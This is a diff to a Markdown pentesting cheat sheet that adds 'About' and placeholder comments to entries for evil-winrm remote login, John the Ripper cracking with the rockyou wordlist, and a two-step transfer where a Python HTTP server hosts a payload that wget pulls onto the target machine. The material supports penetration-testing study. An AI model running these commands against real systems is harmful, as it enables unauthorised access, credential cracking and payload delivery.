@@ -211,21 +211,17 @@ smbclient -N \\\\{TARGET_IP}\\{SHARE} -u Administrator
 
 <br />
 
-**OVERVIEW**
- 
-|   |  	 | 
-| :-----------: | :-----------: |
-| Description | 	  A tool used to hack WINRM from a linux console | 
-| Download | Pre-installed on Kali Linux  |   
-
-<br />
-
-**USAGE**
-
-<br />
-
 ```bash
+# About: A tool used to hack WINRM from a linux console
+# Download: Pre-installed on Kali Linux
+
+# Usage
 evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
+
+# Note: Requires credentials
+# {IP ADDRESS}: IP Address of the Server
+# {USERNAME}:   User Authentication
+# {PASSWORD}:   Password Authentication
 ```
 
 <br />
@@ -252,7 +248,12 @@ evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
 <br />
 
 ```bash
-john -w=/usr/share/wordlists/rockyou.txt {file.txt}
+# About: A tool used to crack passwords and hashes 
+# Download: Pre-installed on Kali Linux
+
+john -w=/usr/share/wordlists/rockyou.txt {FILE.txt}
+
+# {FILE.txt}: File containing the words to crack
 ```
 
 <br />
@@ -261,36 +262,34 @@ john -w=/usr/share/wordlists/rockyou.txt {file.txt}
 
 ***
 
-## Python Server [1]
-
-<br />
-
-**USAGE**
+## Host Python Server [STEP 1]
 
 <br />
 
 ```bash
-# Host a personal server on client machine
+# About: A python command used to open a server on the client machine
+# Download: Pre-installed on Kali Linux
+
+# USAGE
 sudo python3 -m http.server {PORT}
 
-# {PORT}: Port to open for transfer
+# {PORT}: Port to open for file transfer
 ```
 <br />
 
-## WGET [2] 
-
-<br />
-
-**USAGE**
+## Download File with WGET [STEP 2] 
 
 <br />
 
 ```bash
+# About: A command used to download files on the current machine
+# Download: Pre-installed on Kali Linux
+
 # Download files on the remote machine
 wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
-# {IP ADDRESS}: Python Server IP Address
-# {FILE}: The payload to be trasnfered
+# {IP ADDRESS}: Python Server IP Address from step one
+# {FILE}:       The payload to be trasnfered
 ```
 <br />
 
